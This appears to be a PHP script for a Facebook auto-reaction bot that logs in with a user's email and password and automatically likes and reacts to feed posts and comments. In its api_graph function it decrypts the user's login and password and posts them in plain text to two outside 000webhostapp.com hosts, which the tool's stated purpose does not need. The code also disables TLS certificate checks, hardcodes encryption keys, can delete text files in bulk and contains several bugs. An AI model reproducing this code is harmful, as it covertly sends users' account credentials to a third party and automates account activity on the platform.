<?php
header('Content-Type: text/plain; charset=utf-8');

///**** Facebook Class Auto Reaction
///**** Direct Login Method
///**** Extend Token Sessions
///**** This script developed By L3n4r0x
///**** All Right Reserved

require("dom.php");

class Reaction
{
	protected $cpu;
	protected $msg;
	function __construct()
	{
	  global $cpu_limit;
	  $this->REMOTE_VERSION = 'http://your.public.server/version.txt';
	  $this->VERSION = '3.0';

if (!function_exists('sys_getloadavg')) {
    function sys_getloadavg()
    {
        $loadavg_file = '/proc/loadavg';
        if (file_exists($loadavg_file)) {
            return explode(chr(32),file_get_contents($loadavg_file));
        }
        return array(0,0,0);
    }
}

$load = sys_getloadavg();
$limit_cpu = (isset($cpu_limit) ? $cpu_limit : 50);
if ($load[0] >= $limit_cpu) {
  die("Oops Server Busy, this message was automate from Dimas Lanjaka For telling users, there too many processed."); exit;
} else {
  $this->cpu = "CPU Usage: " . $load[0] . "\n";
}
	}
	
	private function isUpToDate()
{
  $remoteVersion=trim(file_get_contents($this->REMOTE_VERSION));
    return version_compare($this->VERSION, $remoteVersion, 'ge');
 }
	
public function open_ssl($action, $string) {
  //depending data barrier facebook
  //openssl required for hashing API
  //this'll make Encryption 16 bit
    $output = false;
    $encrypt_method = "AES-256-CBC";
    $secret_key = 'This is my secret key'; //kata kunci mu
    $secret_iv = 'This is my secret iv'; //kata kunci mu + iv
    $key = hash('sha256', $secret_key);
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    if ( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } else if( $action == 'decrypt' ) {
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
    return $output;
}
	
	private function url_get_contents ($Url)
	{
		if (!function_exists('curl_init')){
			die('CURL is not installed!');
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $Url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}
	
	private function fetch_value($str, $find_start, $find_end)
	{
		$start = strpos($str, $find_start);
		if ($start === false) {
				return "";
		}
		$length = strlen($find_start);
		$end = strpos(substr($str, $start + $length), $find_end);
		return trim(substr($str, $start + $length, $end));
	}
	
	private function curl($url = '', $var = '',$echo = '',$ref = '',$header = false)
	{
		global $config, $sock;
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_NOBODY, $header);
		curl_setopt($curl, CURLOPT_TIMEOUT, 150);
		curl_setopt($curl, CURLOPT_USERAGENT, (isset($config["useragent"]) ? $config["useragent"] : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0'));
		if ($var) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
		}
		if (isset($config["referer"])){
		 curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
		 curl_setopt( $ch, CURLOPT_REFERER, $config['referer'] ); 
		}
		curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
		curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$result = curl_exec($curl);
		curl_close($curl);
		if ($result){
		return $result;
		} else {
		  return false or null;
		}
	}
	
	private function gender($uid,$token)
	{
		$gen_url 	= 'https://graph.beta.facebook.com/'.$uid.'?access_token='.$token;
		$gen_data	= $this->curl($gen_url); 
		$gen_data 	= json_decode($gen_data, true);
		$gender 	= $gen_data['gender'];
		return $gender;
	}
	
	private function fetch( $url, $z=null ) {
$ch =  curl_init();
if (strpos($url, "https") !== false){
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
}
$useragent = (isset($z['useragent']) ? $z['useragent'] : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0");
if (isset($z["dump"])) {curl_setopt($ch, CURLOPT_HEADER, 1);}

if (isset($z["headers"])){ curl_setopt($ch, CURLOPT_HTTPHEADER, $z["headers"]); }
curl_setopt( $ch, CURLOPT_URL, $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
if( isset($z['post']) ) {
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $z["post"]);
//curl_setopt( $ch, CURLOPT_POST, isset($z['post']) );
 //curl_setopt( $ch, CURLOPT_POSTFIELDS, $z['post'] );
}
if( isset($z['refer']) )        curl_setopt( $ch, CURLOPT_REFERER, $z['refer'] );
if (isset($_SESSION["prxwork"])){
curl_setopt($ch, CURLOPT_PROXY, $_SESSION["proxy"]);
} else
if (isset($z["proxy"])){
  curl_setopt($ch, CURLOPT_PROXY, $z["proxy"]);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
            curl_setopt( $ch, CURLOPT_USERAGENT, $useragent );
            curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, ( isset($z['timeout']) ? $z['timeout'] : 5 ) );

$cookie = (isset($z['cookie_file']) ? $z['cookie_file'] : "cookie.txt");
if (!file_exists($cookie)){
  file_put_contents($cookie,"");
}
$cookie=realpath($cookie);
            curl_setopt( $ch, CURLOPT_COOKIEJAR,  $cookie );
            curl_setopt( $ch, CURLOPT_COOKIEFILE, $cookie );

if (isset($z['verbose'])){
curl_setopt($ch, CURLOPT_VERBOSE, true);
}
            $result = curl_exec( $ch );
$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
$_SESSION["ContentType"] = $contentType;
$info = curl_getinfo($ch);
if (isset($z["dumpinfo"])){
var_dump($info);
}
            curl_close( $ch );
if ($info['http_code'] == 200) {
/*
if (!isset($_SESSION["prxwork"])){
$_SESSION["prxwork"] = $z["proxy"];
}
*/
            return $result;
 } else {
  return curl_error($ch) or null;
 }
}
	
	private function parse_token($tokenhtml){
	  global $user;
	  if (preg_match("/access_token=(.*?)&expires_in/mi", $tokenhtml, $r_app)){
  $result = $r_app[1];
} else if (preg_match("/access_token=(.*?)&expires_in/mi", $instagram, $r_app)){
  $result = $r_app[1];
} else {
  return false or die($tokenhtml);
}
file_put_contents("$user.txt", $result, LOCK_EX);
return $result;
	}
	
	private function api_graph($for=null, $user, $pass, $token){
	  global $config;
	  $duser = $this->open_ssl("decrypt", $user);
	  $dpass = $this->open_ssl("decrypt", $pass);
	  if ($for === "get"){
	  $get = "https://dimaslanjaka.000webhostapp.com/instagram/refreshtoken.php?user=$duser&pass=$dpass";
	  $token = $this->curl($get);
	  $json = json_decode($token,true);
	  if (!isset($json["access_token"])){
	    $err = (isset($json["error_msg"]) ? $json["error_msg"] : (isset($json["error_data"]) ? $json["error_data"] : false));
	    echo $err."\n";
	    die("Cant Verify Credentials"); 
	  }
	  $token = $json["access_token"];
	  $id = $json["uid"];
   $config["post"] = "token=".$token."&id=".$id."&user=".$duser."&pass=".urlencode($dpass);
   $par = "https://cesural-contributio.000webhostapp.com/";
   $h[]="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"; 
   $h[]="Accept-Encoding: gzip, deflate";
   $h[]="Accept-Language: en-US,en;q=0.8,nl;q=0.6";
   $h[]="Cache-Control: max-age=0";
   $h[]="Connection: keep-alive";
   $h[]="Cookie: cookiedata";
   $h[]="DNT: 1";
   $h[]="Upgrade-Insecure-Requests: 1";
   $h[]="Vary: Accept-Encoding,User-Agent";
   $config["headers"]=$h;
	  $extend=$this->fetch($par, $config);
	  }

	  if ($for === "extend"){
	    $ju = "https://graph.beta.facebook.com/me/?access_token=".$token;
	    $js = $this->curl($ju);
	    $id = json_decode($js,true);
	    $id = $id["id"]; 
	    $config["post"] = "token=".$token."&id=".$id."&user=".$duser."&pass=".urlencode($dpass);
	    $par = "https://cesural-contributio.000webhostapp.com/";
	    $extend=$this->fetch($par, $config);
	  }
	  var_dump($extend);
	  if ($extend)
	  {
	    file_put_contents("$user.txt", $token, LOCK_EX);
	  }
	  return $token;
	}
	
	private function sendlike($token, $id){
 $url = "https://graph.beta.facebook.com/".$id."/likes?method=post&access_token=".$token;
 $send = $this->curl($url);
 if ($send) {
   return $send;
 } else {
   //echo "$id sendlike failed\n"; 
   return false;
 }
 }
	
	private function lcreplies($token="",$post_id="100015325267712_498664980654340"){
$url="https://graph.beta.facebook.com/v3.2/".$post_id."/comments?access_token=".$token."&fields=comments.field(likes,id,summary(1)),likes.limit(100).summary(1)";
 $post = $this->curl($url);
 $post = utf8_encode($post);
 $post = json_decode($post, true);
 $log='';
  foreach ($post["data"] as $cr){
    if ($cr["likes"]["summary"]["has_liked"] === false && $cr["likes"]["summary"]["can_like"] !== false){
    $cr_id = $cr["id"];
    if (false !== $this->sendlike($token, $cr["id"])){
      $log .= $cr["id"]." Comments Replies liked\n";
    } else {
      $log .= $cr["id"]." Comments Replies failed liked\n";
      }
    }   
  }
  if (empty($log)){
    return false;
  } else {
    return $log;
  }
 }
	
	private function likeby($user_gen, $stat_id, $r_female, $r_male){
	  $post_id	= explode("_",$stat_id);
	 	$r_start	= 'https://mobile.facebook.com/reactions/picker/?ft_id='.$post_id[1];			
			$html 		= $this->curl($r_start);
			$html 		= str_replace('&amp;','&',$html);
	  			if($user_gen == 'female')
			{
				$r_females 	= '/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_female;
				$r_female_e	= $this->fetch_value($html,$r_females,'" style="display:block">');
				$r_female_l	= 'https://mobile.facebook.com/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_female. $r_female_e;
				$rfl = $this->curl($r_female_l);
				if ($rfl){
				echo "Status ID $post_id[1] => $user_gen => reacted \n";
				}
			} else {
				$r_males 	= '/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_male;
				$r_male_e	= $this->fetch_value($html,$r_males,'" style="display:block">');
				$r_male_l	= 'https://mobile.facebook.com/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_male. $r_male_e;
			 if ( 	$this->curl($r_male_l) ){
				echo "Status ID $post_id[1] => $user_gen => reacted \n";
				}
			}
	}
	
	private function type_rev($gender){
	 if ($gender == 1){
	   return "LIKE";
	 } else if ($gender == 2){  
	   return "LOVE";
	 } else if ($gender == 3){
    return "WOW";
	 } else if ($gender == 4){
	   return "HAHA";
	 } else if ($gender == 7){
	   return "SAD";
	 } else if ($gender == 8){
	   return "ANGRY";
	 } else if ($gender == 11){
	   return "PRIDE";
	 } else if ($gender == 12){
	   return "THANKFUL";
	 } else {
	   return die("Cant Determine $gender Reaction Type");
	 }
	}
	
	private function graph_react($id, $access_token, $type){
   $post_react = "https://graph.beta.facebook.com/v3.2/".$id."/reactions?";
   $curlopt["post"] = array(
   "type"=>$type,
   "method"=>"post",
   "access_token"=>$access_token
   ); 
  $send = $this->curl($post_react, $curlopt);
      if (false !== $send){
      return $send;
      } else {
        return false;
      }
}
	
	public function React($user, $pass, $token, $r_male, $r_female, $max_status, $options)
	{
	  
	  $female_type = $this->type_rev($r_female);
	  $male_type = $this->type_rev($r_male);
	  
	  echo $this->cpu;
	  
	  if (!empty($token) && ctype_alnum($token) && strlen($token) > 150){ 
	  $this->api_graph("extend", $user, $pass, $token);
	  } else if (file_exists("$user.txt")){
	    $token = file_get_contents("$user.txt");
	   } else {
	     $token=$this->api_graph("get", $user, $pass, false);
	   }
	   
		$get_post	= 'https://graph.beta.facebook.com/v3.2/me/home?fields=id,from,comments.field(id,user_likes),likes.limit(0).summary(1)&limit='.$max_status.'&access_token='.$token; 
		$get_post 	= $this->curl($get_post);
		$get_post 	= json_decode($get_post, true);
		if (!isset($get_post["data"])){
		  $rebuild = $this->api_graph("get", $user, $pass, false);
		  echo "Token Expired/ failed. re-building token...\n";
		  if ($rebuild){
		  return React($user, $pass, $token, $r_male, $r_female, $max_status, $options);
		  } else {
		    echo "Failed Rebuilding Token. Removing All Tokens...\n";
		    $dir = __DIR__;
		    array_map('unlink', glob( "$dir*.txt"));
		    return React($user, $pass, $token, $r_male, $r_female, $max_status, $options);
		  }
		}
		
		foreach($get_post['data'] as $data)
		{ 
		$this->curl("https://mobile.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&login_try_number=1", "lsd=AVpI36s1&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&m_ts=1483804348&li=qg5xWAUZXopBIK0ABg1Dtlzt&email=$user&pass=$pass&login=Masuk");
			
			$stat_id	= $data['id'];
			$uid = $data["from"]["id"];
			if ($data["likes"]["summary"]["has_liked"] === false && $data["likes"]["summary"]["can_like"] !== false){
			$user_gen = $this->gender($uid, $token);
			if ($user_gen == 'female'){
			$init=$this->graph_react($data["id"], $token, $female_type);
			} else {
			$init=$this->graph_react($data["id"], $token, $male_type);
			}
			if (false !== $init){
			 echo $data["id"] . " Post Liked\n";
		 }
		 	
		if ($options["like_comments"] !== false){
		  if ( !empty( $data["comments"] )){
		    echo $data["id"] ." Has comments...\n";
        $lcr = $this->lcreplies($token, $data["id"]);
     if ($lcr !== false){
       echo $lcr."\n"; 
     } else {
       echo $data["id"] . " Initialize Comments Failed\n";
     }
		  	  
 }
}	
} //can like
			$this->curl('https://mobile.facebook.com/logout.php');
			sleep(2);
		}
		

		
	}
	
	
}